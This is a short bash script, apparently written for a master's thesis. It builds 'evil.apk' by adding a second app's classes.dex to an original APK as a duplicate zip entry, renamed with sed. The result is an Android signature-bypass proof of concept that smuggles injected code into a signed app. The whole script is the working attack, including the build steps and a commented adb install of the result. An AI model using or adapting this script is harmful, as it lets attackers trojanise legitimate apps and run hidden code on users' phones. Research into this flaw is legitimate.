#!/bin/bash
#
# The infect app must have the same package name. WHY?
# /daten/android/Entwicklung/android-sdk-linux/platform-tools/adb install -r evil.apk
#
# For checking what package structure are present:
#  wget http://dex2jar.googlecode.com/files/dex2jar-0.0.9.15.zip
#  mkdir dex2jar-0.0.9.15; cd dex2jar-0.0.9.15; unzip ../dex2jar-0.0.9.15.zip; cd ..
#  sh dex2jar-0.0.9.15/dex2jar.sh DEXPATH/classes.dex
#  
ASDK="/daten/android/Entwicklung/android-sdk-linux/"
#
#mainFile="masterArbeit_Test_1.apk"
#infectFile="masterArbeit_Test_1_edit.apk"
#
mainFile=$1
infectFile=$2
#
cp $mainFile tmp.apk
#
# Show package names of the apks
echo "Package names: "
$ASDK/build-tools/17.0.0/aapt dump badging $mainFile | grep launchable-activity | sed -n -e 's/.* name=\(.*\)  label=.*/\1/p'
$ASDK/build-tools/17.0.0/aapt dump badging $infectFile | grep launchable-activity | sed -n -e 's/.* name=\(.*\)  label=.*/\1/p'
#
mkdir -p mainAPP
mkdir -p infectAPP
#
cd mainAPP; unzip ../$mainFile; cd ..
cd infectAPP; unzip ../$infectFile; cd ..
#
cp mainAPP/classes.dex ./classes.dex
cp infectAPP/classes.dex ./classes.dey
#
#cp classes.dex classes.dey
#
# Remove the original dex file
zip -d tmp.apk classes.dex
#zip -d tmp.apk META-INF/CERT.SF
#cd masterArbeit_Test_1/
#zip -g ../tmp.apk META-INF/CERT.SF
#cd ..
#CERT.SF
#
# Add the infektet dex file
zip -g tmp.apk classes.dey
#
# Add the origin dex file
zip -g tmp.apk classes.dex
#
# Change name of the infectet dex file
sed s/classes.dey/classes.dex/ tmp.apk > evil.apk
#
#
# Clean up
rm -Rf mainAPP infectAPP classes.dey classes.dex tmp.apk
#
